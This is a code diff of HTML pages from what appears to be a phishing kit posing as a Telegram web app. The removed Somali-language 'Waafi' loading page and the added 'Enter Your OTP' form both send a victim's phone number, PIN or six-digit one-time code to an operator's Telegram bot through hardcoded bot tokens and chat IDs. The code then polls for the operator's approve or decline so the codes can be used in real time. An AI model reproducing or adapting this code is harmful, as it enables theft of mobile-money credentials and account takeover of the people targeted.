@@ -1,52 +1,164 @@
 <!DOCTYPE html>
-<html lang="so">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Waafi - Diyaarinta</title>
+    <title>Enter Your OTP</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <style>
-        body {
-            font-family: -apple-system, sans-serif;
-            background-color: #7a7a7a;
+        * {
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            padding: 0;
+            box-sizing: border-box;
         }
         
-        .loading-card {
-            background: white;
-            width: 90%;
-            max-width: 380px;
-            padding: 50px 20px;
-            border-radius: 15px;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+        }
+        
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px 0;
+            color: #1a1a1a;
+        }
+        
+        .logo-img {
+            max-height: 40px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .header-section {
+            margin-top: 25px;
+            margin-bottom: 25px;
+        }
+        
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-bottom: 12px;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #718096;
+            line-height: 1.5;
+        }
+        
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        
+        .otp-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .otp-box {
+            width: 48px;
+            height: 52px;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 12px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a202c;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
         
-        .loader-circle {
-            width: 120px;
-            height: 120px;
-            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%);
-            border-radius: 50%;
-            margin: 0 auto 30px;
-            display: flex;
+        .otp-box:focus {
+            border-color: #1a202c;
+        }
+        
+        .timer-text {
+            font-size: 15px;
+            color: #4a5568;
+            font-weight: 500;
+            margin-top: 5px;
+        }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #2b6cb0;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 0;
+            display: none;
+        }
+        
+        .bottom-section {
+            margin-top: auto;
+            padding-top: 20px;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #92a4c0;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: background-color 0.2s ease;
+        }
+        
+        .submit-btn.active {
+            background-color: #4a5568;
+            cursor: pointer;
+        }
+        
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            z-index: 1000;
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            gap: 12px;
         }
         
-        .loader-circle::after {
-            content: '';
-            width: 90px;
-            height: 90px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid white;
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #cbd5e0;
+            border-top: 4px solid #4a5568;
             border-radius: 50%;
-            animation: spin 1.5s linear infinite;
+            animation: spin 1s linear infinite;
         }
         
         @keyframes spin {
@@ -57,171 +169,267 @@
                 transform: rotate(360deg);
             }
         }
-        
-        h2 {
-            color: #82d13d;
-            font-size: 28px;
-            margin: 0 0 10px;
-        }
-        
-        p {
-            color: #555;
-            font-size: 16px;
-            margin: 0;
-        }
-        
-        .status-text {
-            margin-top: 15px;
-            font-size: 14px;
-            color: #777;
-            word-break: break-all;
-        }
     </style>
 </head>
 
 <body>
-    <div class="loading-card">
-        <div class="loader-circle"></div>
-        <h2 id="main-text">Habaynta...</h2>
-        <p id="sub-text">Diyaarinaya xaqiijinta...</p>
-        <p id="poll-status" class="status-text"></p>
+
+    <div class="top-bar">
+        <button class="back-btn" onclick="history.back()">&#8592;</button>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="Logo" class="logo-img">
     </div>
 
+    <div class="header-section">
+        <h1 class="title">Enter Your OTP</h1>
+        <p class="subtitle" id="subtitleText">Please enter the OTP code just sent to your phone.</p>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <span id="loading-text">Waiting for approval...</span>
+    </div>
+
+    <form class="form-container" id="otpForm">
+        <!-- 6-Digit OTP Box Input -->
+        <div class="otp-container">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
+        </div>
+
+        <!-- Timer / Resend section -->
+        <div class="timer-text" id="timer">00:47</div>
+        <button type="button" class="resend-btn" id="resendBtn">Resend Code</button>
+
+        <div class="bottom-section">
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continue</button>
+        </div>
+    </form>
+
     <script>
-        // ============================================================
-        // CONFIGURE YOUR BOT HERE
-        // ============================================================
-        const BOT_TOKEN = "8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY"; // <-- Replace with your bot token
-        const ADMIN_CHAT_ID = "5615316142"; // <-- Replace with admin chat ID
-        // ============================================================
+        document.addEventListener("DOMContentLoaded", function() {
+            const otpBoxes = document.querySelectorAll('.otp-box');
+            const submitBtn = document.getElementById('submitBtn');
+            const timerDisplay = document.getElementById('timer');
+            const resendBtn = document.getElementById('resendBtn');
+            const otpForm = document.getElementById('otpForm');
+            const overlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
 
-        document.addEventListener("DOMContentLoaded", async() => {
-            const mainText = document.getElementById("main-text");
-            const subText = document.getElementById("sub-text");
-            const pollStatus = document.getElementById("poll-status");
-            const tg = window.Telegram ? .WebApp;
+            // Bot Configuration
+            const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
+            const ADMIN_CHAT_ID = "8406078749";
 
-            if (tg) {
-                tg.ready();
-                tg.expand();
-            }
+            // --- OTP Auto-Focus & Navigation Logic ---
+            otpBoxes.forEach((box, index) => {
+                box.addEventListener('input', function() {
+                    this.value = this.value.replace(/\D/g, ''); // Digits only
 
-            // ---- Read start_param ----
-            let startParam = '';
-            if (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
-                startParam = tg.initDataUnsafe.start_param;
-            }
-            const urlParams = new URLSearchParams(window.location.search);
-            const urlStart = urlParams.get('start_param') || urlParams.get('start');
-            const decision = startParam || urlStart || '';
-
-            // If approved/denied from deep link, redirect immediately
-            if (decision === 'approved') {
-                mainText.textContent = "La ansixiyay!";
-                subText.textContent = "Bogga xiga ayaa kuu furmaya...";
-                setTimeout(() => {
-                    window.location.href = "/page8.html";
-                }, 1500);
-                return;
-            }
-            if (decision === 'denied') {
-                mainText.textContent = "La diiday!";
-                subText.textContent = "Xogtaada waa khalad.";
-                setTimeout(() => {
-                    window.location.href = "/page6.html";
-                }, 1500);
-                return;
-            }
-
-            // ---- No decision yet — send notification to bot admin ----
-            const phone = localStorage.getItem("phone") || "";
-            const pin = localStorage.getItem("lastPin") || "";
-
-            if (!phone) {
-                mainText.textContent = "Khalad";
-                subText.textContent = "Lambarka taleefanka lama helin";
-                return;
-            }
-
-            // Generate a unique session ID for this request
-            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
-            localStorage.setItem("sessionId", sessionId);
-
-            // Store the decision locally (polling will check this)
-            localStorage.removeItem("botDecision");
-
-            // Send login notification to admin via Telegram bot API
-            const message = `🔔 *Codsiga Login*\n\n📱 Phone: \`${phone}\`\n🔢 PIN: \`${pin}\`\n🆔 Session: \`${sessionId}\``;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ Approved",
-                        callback_data: `approve:${sessionId}`
-                    }, {
-                        text: "❌ Decline",
-                        callback_data: `decline:${sessionId}`
-                    }]
-                ]
-            };
-
-            const payload = {
-                chat_id: ADMIN_CHAT_ID,
-                text: message,
-                parse_mode: "Markdown",
-                reply_markup: JSON.stringify(inlineKeyboard)
-            };
-
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(payload)
+                    if (this.value && index < otpBoxes.length - 1) {
+                        otpBoxes[index + 1].focus();
+                    }
+                    validateOtp();
                 });
-                const result = await res.json();
-                if (result.ok) {
-                    console.log("✅ Notification sent to admin");
-                    pollStatus.textContent = "Codsiga waa la diray... sug ansixinta";
-                } else {
-                    console.error("❌ Telegram API error:", result);
-                    pollStatus.textContent = "Khalad: " + (result.description || "Unknown");
-                }
-            } catch (err) {
-                console.error("❌ Failed to send notification:", err);
-                pollStatus.textContent = "Khalad: network error";
+
+                box.addEventListener('keydown', function(e) {
+                    if (e.key === "Backspace" && !this.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                    }
+                });
+
+                box.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasteData = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = pasteData.replace(/\D/g, '').split('');
+
+                    otpBoxes.forEach((b, i) => {
+                        b.value = digits[i] || '';
+                    });
+
+                    const firstEmpty = Array.from(otpBoxes).findIndex(b => !b.value);
+                    if (firstEmpty !== -1) {
+                        otpBoxes[firstEmpty].focus();
+                    } else {
+                        otpBoxes[otpBoxes.length - 1].focus();
+                    }
+                    validateOtp();
+                });
+            });
+
+            function validateOtp() {
+                const isComplete = Array.from(otpBoxes).every(box => box.value.length === 1);
+                submitBtn.disabled = !isComplete;
+                submitBtn.classList.toggle('active', isComplete);
             }
 
-            // ---- Update text after 3 seconds ----
-            setTimeout(() => {
-                mainText.textContent = "Fadlan sug...";
-                subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
-            }, 3000);
+            // --- Countdown Timer Logic ---
+            let timeLeft = 47;
+            let timerInterval;
 
-            // ---- Poll for decision ----
-            async function checkDecision() {
-                const storedDecision = localStorage.getItem("botDecision");
-                if (storedDecision === "approved") {
-                    mainText.textContent = "La ansixiyay!";
-                    subText.textContent = "Bogga xiga ayaa kuu furmaya...";
-                    clearInterval(pollInterval);
-                    setTimeout(() => {
-                        window.location.href = "/page8.html";
-                    }, 1500);
-                } else if (storedDecision === "denied") {
-                    mainText.textContent = "La diiday!";
-                    subText.textContent = "Xogtaada waa khalad.";
-                    clearInterval(pollInterval);
-                    setTimeout(() => {
-                        window.location.href = "/page6.html";
-                    }, 1500);
-                }
+            function startTimer() {
+                timerDisplay.style.display = "block";
+                resendBtn.style.display = "none";
+
+                timerInterval = setInterval(() => {
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerDisplay.style.display = "none";
+                        resendBtn.style.display = "inline-block";
+                    } else {
+                        timeLeft--;
+                        const seconds = timeLeft < 10 ? `0${timeLeft}` : timeLeft;
+                        timerDisplay.textContent = `00:${seconds}`;
+                    }
+                }, 1000);
             }
 
-            const pollInterval = setInterval(checkDecision, 2000);
+            resendBtn.addEventListener('click', function() {
+                timeLeft = 47;
+                startTimer();
+            });
+
+            startTimer();
+
+            // --- Form Submission & Telegram Verification ---
+            otpForm.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
+                let otpCode = "";
+                otpBoxes.forEach(box => {
+                    otpCode += box.value;
+                });
+
+                if (otpCode.length !== 6) return;
+
+                const phone = localStorage.getItem("phone") || "Unknown";
+                const sessionId = 'otp_' + Date.now();
+
+                // Show loading screen
+                if (overlay) overlay.style.display = "flex";
+                loadingText.textContent = "Waiting for admin approval...";
+
+                const message = `🔔 *OTP Verification Code*\n\n📱 Phone: \`${phone}\`\n🔢 OTP: \`${otpCode}\`\n🆔 Session: \`${sessionId}\``;
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approved",
+                            callback_data: `approve:${sessionId}`
+                        }, {
+                            text: "❌ Decline",
+                            callback_data: `decline:${sessionId}`
+                        }]
+                    ]
+                };
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown",
+                            reply_markup: inlineKeyboard
+                        })
+                    });
+
+                    const result = await response.json();
+                    if (result.ok) {
+                        startPollingForApproval(BOT_TOKEN, sessionId);
+                    } else {
+                        if (overlay) overlay.style.display = "none";
+                        alert("Error sending request. Please try again.");
+                    }
+                } catch (err) {
+                    console.error("Network error:", err);
+                    if (overlay) overlay.style.display = "none";
+                    alert("Network error. Please check your connection.");
+                }
+            });
+
+            // Poll Telegram for Approval/Decline feedback
+            function startPollingForApproval(botToken, sessionId) {
+                let offset = 0;
+                let pollInterval = setInterval(async function() {
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=5`);
+                        const data = await response.json();
+
+                        if (data.ok && data.result) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const callbackData = update.callback_query.data;
+                                    const callbackQueryId = update.callback_query.id;
+
+                                    if (callbackData === `approve:${sessionId}`) {
+                                        clearInterval(pollInterval);
+
+                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type": "application/json"
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: callbackQueryId,
+                                                text: "Approved!"
+                                            })
+                                        });
+
+                                        loadingText.textContent = "Approved! Redirecting...";
+                                        setTimeout(() => {
+                                            window.location.href = "page8.html";
+                                        }, 1000);
+                                        return;
+                                    } else if (callbackData === `decline:${sessionId}`) {
+                                        clearInterval(pollInterval);
+
+                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type": "application/json"
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: callbackQueryId,
+                                                text: "Declined. Please re-enter."
+                                            })
+                                        });
+
+                                        if (overlay) overlay.style.display = "none";
+
+                                        // Reset form for re-entry
+                                        otpBoxes.forEach(box => box.value = "");
+                                        otpBoxes[0].focus();
+                                        validateOtp();
+
+                                        alert("OTP was declined. Please re-enter.");
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Polling error:", error);
+                    }
+                }, 2000);
+            }
+
+            // Telegram WebApp initialization
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
         });
     </script>
+
 </body>
 
 </html>
